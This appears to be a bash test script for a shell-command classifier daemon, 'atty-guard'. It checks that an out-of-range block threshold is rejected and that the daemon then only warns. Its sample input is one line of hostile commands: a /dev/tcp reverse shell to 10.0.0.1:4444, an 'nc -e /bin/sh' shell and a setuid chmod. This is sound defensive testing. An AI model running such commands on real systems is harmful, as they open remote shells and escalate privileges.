#!/usr/bin/env bash
# V2-J-2: `Classifier::with_block_threshold` rejects out-of-range
# values (≤ WARN_THRESHOLD = 0.5, > 1.0, NaN, non-finite). The daemon
# logs a stderr warning and degrades to "no auto-Block" — verdicts
# behave as if block_threshold weren't configured.

source "$(dirname "${BASH_SOURCE[0]}")/../lib/common.sh"

CONFIG_FILE=$(mktemp -t atty-guard-autoblock.XXXXXX.toml)
trap 'rm -f "$CONFIG_FILE"' EXIT

# 0.5 == WARN_THRESHOLD — must be rejected (strict-lower bound).
cat > "$CONFIG_FILE" <<TOML
[accumulator]
block_threshold = 0.5
TOML

start_guard --tier2 stub --config "$CONFIG_FILE"

# Multi-hit at combined > 0.5. With auto-Block degraded, verdict stays
# Warn (the V2-J Phase 1 behaviour).
classify "bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x"
expect_verdict warn

# Confirm the stderr warning fired — the daemon prints
# `atty-guard: ignoring [accumulator] block_threshold = 0.5 — must
# be a finite number in (0.5, 1.0]; keeping default (no auto-Block)`.
LOG_CONTENT="$(guard_log)"
case "$LOG_CONTENT" in
    *"ignoring [accumulator] block_threshold"*) ;;
    *) fail "expected stderr warning about out-of-range threshold; got: $LOG_CONTENT" ;;
esac

pass "V2-J-2 range guard: 0.5 rejected, daemon emits warning, no auto-Block"
